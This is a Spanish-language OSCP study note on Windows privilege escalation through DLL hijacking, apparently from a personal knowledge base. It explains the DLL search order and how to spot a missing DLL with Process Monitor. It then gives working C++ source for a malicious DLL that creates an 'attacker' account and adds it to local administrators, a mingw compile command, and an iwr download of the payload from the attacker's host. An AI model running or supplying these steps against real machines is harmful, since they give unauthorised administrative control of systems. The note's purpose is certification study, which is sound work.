---
tipo: tecnica
fase: privesc
so: windows
tags: [oscp, tecnica, privesc, windows]
fecha: 2026-10-08
---

# DLL Hijacking

> [!abstract] Qué es y cuándo usarla
> Cuando un proceso carga una DLL sin ruta absoluta, Windows la busca en un orden fijo (**DLL search order**), empezando por el directorio de la propia app. Si a una app le falta una DLL esperada, colocar una DLL maliciosa con ese nombre exacto en su directorio hace que se cargue y ejecute código propio con los privilegios de quien lanza la app (interesante si la lanza un admin o un servicio).

## Requisitos previos
- Permiso de escritura en el directorio de la app (`echo "test" > 'C:\ruta\app\test.txt'`).
- Identificar qué DLL falta: con **Process Monitor** (`Procmon64.exe`, requiere privilegios o ejecutarlo como otro user), filtrar `Process Name` = binario de la app, buscar operaciones `CreateFile` con resultado `NAME NOT FOUND` sobre un `.dll`.
- Capacidad de cross-compilar DLLs en Kali (`mingw-w64`).

## Pasos
```powershell
# comprobar escritura en el directorio de la app
echo "test" > 'C:\ruta\app\test.txt'
type 'C:\ruta\app\test.txt'
```
Con Process Monitor: añadir filtro `Process Name is <app>.exe → Include`, limpiar eventos (`Clear`), relanzar la app, filtrar además por `Operation is CreateFile` y columna `Path` para localizar el `NAME NOT FOUND` de la DLL que falta.

```cpp
// DLL mínima en C++: ejecuta un comando al cargarse
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("net user attacker Password123! /add");
            system("net localgroup administrators attacker /add");
            break;
    }
    return TRUE;
}
```
```bash
x86_64-w64-mingw32-gcc dll.cpp --shared -o NombreQueFalta.dll
python3 -m http.server 80
```
```powershell
iwr -uri http://<IP_kali>/NombreQueFalta.dll -OutFile 'C:\ruta\app\NombreQueFalta.dll'
# esperar a que la app se relance (por un admin, o forzarlo si es un servicio) y comprobar:
net localgroup administrators
```

> [!warning] Detección / problemas
> - `DllMain` debe actuar en `DLL_PROCESS_ATTACH` (se ejecuta al cargar la DLL en el proceso).
> - El nombre de la DLL maliciosa debe coincidir exactamente con el que la app busca.
> - Hace falta que alguien (admin/servicio) relance la app para disparar la carga; no siempre es inmediato.

## Visto en
- Módulo: [[17 - Windows Privilege Escalation]]
- Relacionado: [[Service Binary Hijacking]] · [[Unquoted Service Paths]]
- Máquinas: [[]]
